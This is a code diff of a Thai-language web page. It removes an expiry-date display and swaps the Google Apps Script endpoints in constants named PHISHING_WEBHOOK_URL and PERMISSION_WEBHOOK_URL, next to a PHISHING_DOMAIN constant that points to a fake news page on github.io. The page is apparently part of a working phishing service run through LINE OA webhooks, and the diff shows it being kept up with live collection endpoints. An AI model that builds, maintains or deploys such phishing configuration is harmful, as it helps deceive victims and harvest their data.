@@ -635,25 +635,6 @@
                 padding: 12px 15px;
             }
         }
-
-        /* เพิ่ม style สำหรับส่วนแสดงวันหมดอายุ */
-        .expiry-info {
-            margin-top: 8px;
-            font-size: 13px;
-            color: var(--text-light);
-            padding: 4px 8px;
-            border-radius: 4px;
-            background-color: rgba(0, 0, 0, 0.05);
-        }
-
-        .expiry-info.expired {
-            background-color: rgba(255, 82, 82, 0.1);
-            color: var (--error-color);
-        }
-
-        .expiry-info i {
-            margin-right: 5px;
-        }
     </style>
 </head>
 <body>
@@ -685,10 +666,6 @@
                         <div class="user-status">
                             <span><i class="fas fa-circle-info"></i> สถานะ:</span> <span id="userStatus">ตรวจสอบสิทธิ์...</span>
                             <span id="statusBadge" class="badge">รอตรวจสอบ</span>
-                        </div>
-                        <div id="expiryInfo" class="expiry-info" style="display: none;">
-                            <i class="fas fa-clock"></i>
-                            <span id="expiryText"></span>
                         </div>
                     </div>
                 </div>
@@ -764,8 +741,8 @@
         
         // URL สำหรับ webhook - แก้ไขให้ใช้ URL เดียวกันทั้งระบบ
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec';
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw2OCAjleh-akN-gDtLdR483oF-2C2DRWOEJx5H5yc12WljaCBz06WVvEOQDxeoi2Oj/exec';
-        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbw2OCAjleh-akN-gDtLdR483oF-2C2DRWOEJx5H5yc12WljaCBz06WVvEOQDxeoi2Oj/exec';
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
+        const PERMISSION_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzGxsU_6Zb8rhFMn52O1B85v3MCCo_FnQimmAxupxVCS3RE0XmYiHfj3S1wGwUpJGLv/exec';
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
         
         // เริ่มต้นการทำงานเมื่อโหลดหน้าเว็บ
